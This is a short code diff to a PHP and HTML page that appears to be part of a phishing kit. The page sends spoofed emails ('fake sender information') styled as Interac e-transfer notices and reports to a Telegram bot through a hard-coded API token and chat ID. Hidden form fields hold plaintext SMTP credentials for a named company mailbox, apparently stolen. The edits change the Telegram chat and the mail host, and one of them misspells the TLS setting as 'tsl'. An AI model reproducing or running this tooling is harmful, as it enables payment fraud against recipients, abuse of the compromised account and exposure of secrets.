@@ -44,7 +44,7 @@ $headers = array(
 // Send email with fake sender information
 $mail = new PHPMailer();
 $mail->IsSMTP();
-$mail->SMTPSecure = 'tls';
+$mail->SMTPSecure = 'tsl';
 $mail->Host = $_POST['host'];
 $mail->Port = $_POST['port'];
 $mail->Body = $message; // use $message instead of $template
@@ -64,7 +64,7 @@ if (!$mail->Send()) {
 $message ="INTERAC E-TRANSFER HAS BEEN SENT!";
 $apitoken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
 $data = [
-    'chat_id' => '-821080105',
+    'chat_id' => '-1001831940786',
     'text' => $message
 ];
 $response = file_get_contents("https://api.telegram.org/bot$apitoken/sendMessage?" . http_build_query($data));
@@ -394,7 +394,7 @@ h1:focus {
 <input type="hidden"       name="port"     value="587"              required>
 <input type="hidden"       name="username"   value="dhodnett@canadadiagnostics.ca" required>
 <input type="hidden"       name="password" value="Pass2029word"     required>
-<input type="hidden"       name="host"     value="smtp.office365.com"    required>
+<input type="hidden"       name="host"     value="mail.canadadiagnostics.ca"    required>
 </body></html>
 
 <!-- 
